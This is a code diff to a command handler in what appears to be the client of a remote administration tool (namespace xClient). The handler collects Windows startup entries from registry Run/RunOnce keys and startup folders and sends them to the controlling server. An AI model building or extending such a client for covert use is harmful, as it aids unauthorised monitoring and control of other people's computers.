@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
@@ -595,45 +596,46 @@ namespace xClient.Core.Commands
 			}
 		}
 
-		public static void HandleGetStartup(object command, Client client)
+		public static void HandleGetStartupItems(object command, Client client)
 		{
 			try
 			{
-				string[] LMRun, LMRunOnce, CURun, CURunOnce, CAStartup, AStartup;
-				LMRun = LMRunOnce = CURun = CURunOnce = CAStartup = AStartup = new string[50];
+				Dictionary<string, int> startupItems = new Dictionary<string, int>();
 
 				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length && i < LMRun.Length; i++)
-						LMRun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+					for (int i = 0; i < key.GetValueNames().Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 0);
 				}
 				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length && i < LMRunOnce.Length; i++)
-						LMRunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+					for (int i = 0; i < key.GetValueNames().Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 1);
 				}
 				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length && i < CURun.Length; i++)
-						CURun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+					for (int i = 0; i < key.GetValueNames().Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 2);
 				}
 				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
 				{
-					for (int i = 0; i < key.GetValueNames().Length && i < CURunOnce.Length; i++)
-						CURunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+					for (int i = 0; i < key.GetValueNames().Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", key.GetValueNames()[i], key.GetValue(key.GetValueNames()[i])), 3);
 				}
 				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
 				{
 					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-					for (int i = 0; i < files.Length && i < CAStartup.Length; i++)
-						CAStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
+					for (int i = 0; i < files.Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", files[i].Name, files[i].FullName), 4);
 				}
 				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
 				{
 					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-					for (int i = 0; i < files.Length && i < AStartup.Length; i++)
-						AStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
+					for (int i = 0; i < files.Length; i++)
+						startupItems.Add(string.Format("{0}||{1}", files[i].Name, files[i].FullName), 5);
 				}
+
+				new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
 			}
 			catch
 			{
